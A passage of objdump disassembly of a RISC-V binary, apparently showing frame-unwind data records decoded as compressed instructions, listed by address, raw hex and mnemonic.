 4b8:	0e42                	slli	t3,t3,0x10
 4ba:	4220                	lw	s0,64(a2)
 4bc:	0288                	addi	a0,sp,320
 4be:	0c42                	slli	s8,s8,0x10
 4c0:	0008                	0x8
 4c2:	5e02                	lw	t3,32(sp)
 4c4:	0cc8                	addi	a0,sp,596
 4c6:	2002                	fld	ft0,0(sp)
 4c8:	0e42                	slli	t3,t3,0x10
 4ca:	0000                	unimp
 4cc:	0000                	unimp
 4ce:	0000                	unimp
 4d0:	0034                	addi	a3,sp,8
 4d2:	0000                	unimp
 4d4:	00b8                	addi	a4,sp,72
 4d6:	0000                	unimp
 4d8:	1f5a                	slli	t5,t5,0x36
 4da:	8000                	0x8000
 4dc:	0000                	unimp
 4de:	0000                	unimp
 4e0:	035e                	slli	t1,t1,0x17
 4e2:	0000                	unimp
 4e4:	0000                	unimp
 4e6:	0000                	unimp
 4e8:	0e42                	slli	t3,t3,0x10
 4ea:	4870                	lw	a2,84(s0)
 4ec:	0281                	addi	t0,t0,0
 4ee:	0488                	addi	a0,sp,576
 4f0:	0689                	addi	a3,a3,2
 4f2:	0892                	slli	a7,a7,0x4
 4f4:	0c42                	slli	s8,s8,0x10
 4f6:	0008                	0x8
 4f8:	c1034803          	lbu	a6,-1008(t1) # ffffffffffff9c10 <_end+0xffffffff7ffddf90>
 4fc:	c842                	sw	a6,16(sp)
 4fe:	020c                	addi	a1,sp,256
 500:	4270                	lw	a2,68(a2)
 502:	42c9                	li	t0,18
 504:	42d2                	lw	t0,20(sp)
 506:	000e                	c.slli	zero,0x3
 508:	002c                	addi	a1,sp,8
 50a:	0000                	unimp
 50c:	00b8                	addi	a4,sp,72
 50e:	0000                	unimp
 510:	22b8                	fld	fa4,64(a3)
 512:	8000                	0x8000
 514:	0000                	unimp
 516:	0000                	unimp
 518:	0056                	c.slli	zero,0x15
 51a:	0000                	unimp
 51c:	0000                	unimp
 51e:	0000                	unimp
 520:	0e42                	slli	t3,t3,0x10
 522:	4470                	lw	a2,76(s0)
 524:	1281                	addi	t0,t0,-32
 526:	1488                	addi	a0,sp,608
 528:	0c42                	slli	s8,s8,0x10
 52a:	4008                	lw	a0,0(s0)
 52c:	4802                	lw	a6,0(sp)
 52e:	42c1                	li	t0,16
 530:	0cc8                	addi	a0,sp,596
 532:	7002                	0x7002
 534:	0e42                	slli	t3,t3,0x10
 536:	0000                	unimp
 538:	002c                	addi	a1,sp,8
 53a:	0000                	unimp
 53c:	00b8                	addi	a4,sp,72
 53e:	0000                	unimp
 540:	230e                	fld	ft6,192(sp)
 542:	8000                	0x8000
 544:	0000                	unimp
 546:	0000                	unimp
 548:	0046                	c.slli	zero,0x11
 54a:	0000                	unimp
 54c:	0000                	unimp
 54e:	0000                	unimp
 550:	0e42                	slli	t3,t3,0x10
 552:	4240                	lw	s0,4(a2)
 554:	0288                	addi	a0,sp,320
 556:	0c42                	slli	s8,s8,0x10
 558:	0008                	0x8
 55a:	c87c                	sw	a5,84(s0)
 55c:	020c                	addi	a1,sp,256
 55e:	4240                	lw	s0,4(a2)
 560:	000e                	c.slli	zero,0x3
 562:	0000                	unimp
 564:	0000                	unimp
 566:	0000                	unimp
 568:	0034                	addi	a3,sp,8
 56a:	0000                	unimp
 56c:	00b8                	addi	a4,sp,72
 56e:	0000                	unimp
 570:	2354                	fld	fa3,128(a4)
 572:	8000                	0x8000
 574:	0000                	unimp
 576:	0000                	unimp
 578:	00c2                	slli	ra,ra,0x10
 57a:	0000                	unimp
 57c:	0000                	unimp
 57e:	0000                	unimp
 580:	0e42                	slli	t3,t3,0x10
 582:	0290                	addi	a2,sp,320
 584:	8144                	0x8144
 586:	880e                	mv	a6,gp
 588:	4210                	lw	a2,0(a2)
 58a:	080c                	addi	a1,sp,16
 58c:	0230                	addi	a2,sp,264
 58e:	c1b4                	sw	a3,64(a1)
 590:	c842                	sw	a6,16(sp)
 592:	020c                	addi	a1,sp,256
 594:	0290                	addi	a2,sp,320
 596:	0e42                	slli	t3,t3,0x10
	...
 5a0:	002c                	addi	a1,sp,8
 5a2:	0000                	unimp
 5a4:	00b8                	addi	a4,sp,72
 5a6:	0000                	unimp
 5a8:	2416                	fld	fs0,320(sp)
 5aa:	8000                	0x8000
 5ac:	0000                	unimp
 5ae:	0000                	unimp
 5b0:	00b8                	addi	a4,sp,72
 5b2:	0000                	unimp
 5b4:	0000                	unimp
 5b6:	0000                	unimp
 5b8:	0e42                	slli	t3,t3,0x10
 5ba:	4250                	lw	a2,4(a2)
 5bc:	0288                	addi	a0,sp,320
 5be:	0c42                	slli	s8,s8,0x10
 5c0:	0008                	0x8
 5c2:	ae02                	fsd	ft0,280(sp)
 5c4:	0cc8                	addi	a0,sp,596
 5c6:	5002                	0x5002
 5c8:	0e42                	slli	t3,t3,0x10
 5ca:	0000                	unimp
 5cc:	0000                	unimp
 5ce:	0000                	unimp
 5d0:	002c                	addi	a1,sp,8
 5d2:	0000                	unimp
 5d4:	00b8                	addi	a4,sp,72
 5d6:	0000                	unimp
 5d8:	24ce                	fld	fs1,208(sp)
 5da:	8000                	0x8000
 5dc:	0000                	unimp
 5de:	0000                	unimp
 5e0:	00ce                	slli	ra,ra,0x13
 5e2:	0000                	unimp
 5e4:	0000                	unimp
 5e6:	0000                	unimp
 5e8:	0e42                	slli	t3,t3,0x10
 5ea:	4250                	lw	a2,4(a2)
 5ec:	0288                	addi	a0,sp,320
 5ee:	0c42                	slli	s8,s8,0x10
 5f0:	0008                	0x8
 5f2:	c402                	sw	zero,8(sp)
 5f4:	0cc8                	addi	a0,sp,596
 5f6:	5002                	0x5002
 5f8:	0e42                	slli	t3,t3,0x10
 5fa:	0000                	unimp
 5fc:	0000                	unimp
 5fe:	0000                	unimp
 600:	002c                	addi	a1,sp,8
 602:	0000                	unimp
 604:	00b8                	addi	a4,sp,72
 606:	0000                	unimp
 608:	259c                	fld	fa5,8(a1)
 60a:	8000                	0x8000
 60c:	0000                	unimp
 60e:	0000                	unimp
 610:	003c                	addi	a5,sp,8
 612:	0000                	unimp
 614:	0000                	unimp
 616:	0000                	unimp
 618:	0e42                	slli	t3,t3,0x10
 61a:	4230                	lw	a2,64(a2)
 61c:	0288                	addi	a0,sp,320
 61e:	0c42                	slli	s8,s8,0x10
 620:	0008                	0x8
 622:	c872                	sw	t3,16(sp)
 624:	020c                	addi	a1,sp,256
 626:	4230                	lw	a2,64(a2)
 628:	000e                	c.slli	zero,0x3
 62a:	0000                	unimp
 62c:	0000                	unimp
 62e:	0000                	unimp
 630:	002c                	addi	a1,sp,8
 632:	0000                	unimp
 634:	00b8                	addi	a4,sp,72
 636:	0000                	unimp
 638:	25d8                	fld	fa4,136(a1)
 63a:	8000                	0x8000
 63c:	0000                	unimp
 63e:	0000                	unimp
 640:	004e                	c.slli	zero,0x13
 642:	0000                	unimp
 644:	0000                	unimp
 646:	0000                	unimp
 648:	0e42                	slli	t3,t3,0x10
 64a:	4230                	lw	a2,64(a2)
 64c:	0288                	addi	a0,sp,320
 64e:	0c42                	slli	s8,s8,0x10
 650:	0008                	0x8
 652:	4402                	lw	s0,0(sp)
 654:	0cc8                	addi	a0,sp,596
 656:	3002                	fld	ft0,32(sp)
 658:	0e42                	slli	t3,t3,0x10
 65a:	0000                	unimp
 65c:	0000                	unimp
 65e:	0000                	unimp
 660:	002c                	addi	a1,sp,8
 662:	0000                	unimp
 664:	00b8                	addi	a4,sp,72
 666:	0000                	unimp
 668:	2626                	fld	fa2,72(sp)
 66a:	8000                	0x8000
 66c:	0000                	unimp
 66e:	0000                	unimp
 670:	0070                	addi	a2,sp,12
 672:	0000                	unimp
 674:	0000                	unimp
 676:	0000                	unimp
 678:	0e42                	slli	t3,t3,0x10
 67a:	4230                	lw	a2,64(a2)
 67c:	0288                	addi	a0,sp,320
 67e:	0c42                	slli	s8,s8,0x10
 680:	0008                	0x8
 682:	6602                	ld	a2,0(sp)
 684:	0cc8                	addi	a0,sp,596
 686:	3002                	fld	ft0,32(sp)
 688:	0e42                	slli	t3,t3,0x10
 68a:	0000                	unimp
 68c:	0000                	unimp
 68e:	0000                	unimp
 690:	002c                	addi	a1,sp,8
 692:	0000                	unimp
 694:	00b8                	addi	a4,sp,72
 696:	0000                	unimp
 698:	2696                	fld	fa3,320(sp)
 69a:	8000                	0x8000
 69c:	0000                	unimp
 69e:	0000                	unimp
 6a0:	004a                	c.slli	zero,0x12
 6a2:	0000                	unimp
 6a4:	0000                	unimp
 6a6:	0000                	unimp
 6a8:	0e42                	slli	t3,t3,0x10
 6aa:	4230                	lw	a2,64(a2)
 6ac:	0288                	addi	a0,sp,320
 6ae:	0c42                	slli	s8,s8,0x10
 6b0:	0008                	0x8
 6b2:	4002                	0x4002
 6b4:	0cc8                	addi	a0,sp,596
 6b6:	3002                	fld	ft0,32(sp)
 6b8:	0e42                	slli	t3,t3,0x10
 6ba:	0000                	unimp
 6bc:	0000                	unimp
 6be:	0000                	unimp
 6c0:	002c                	addi	a1,sp,8
 6c2:	0000                	unimp
 6c4:	00b8                	addi	a4,sp,72
 6c6:	0000                	unimp
 6c8:	26e0                	fld	fs0,200(a3)
 6ca:	8000                	0x8000
 6cc:	0000                	unimp
 6ce:	0000                	unimp
 6d0:	00dc                	addi	a5,sp,68
 6d2:	0000                	unimp
 6d4:	0000                	unimp
 6d6:	0000                	unimp
 6d8:	0e42                	slli	t3,t3,0x10
 6da:	4230                	lw	a2,64(a2)
 6dc:	0288                	addi	a0,sp,320
 6de:	0c42                	slli	s8,s8,0x10
 6e0:	0008                	0x8
 6e2:	d202                	sw	zero,36(sp)
 6e4:	0cc8                	addi	a0,sp,596
 6e6:	3002                	fld	ft0,32(sp)
 6e8:	0e42                	slli	t3,t3,0x10
 6ea:	0000                	unimp
 6ec:	0000                	unimp
	...
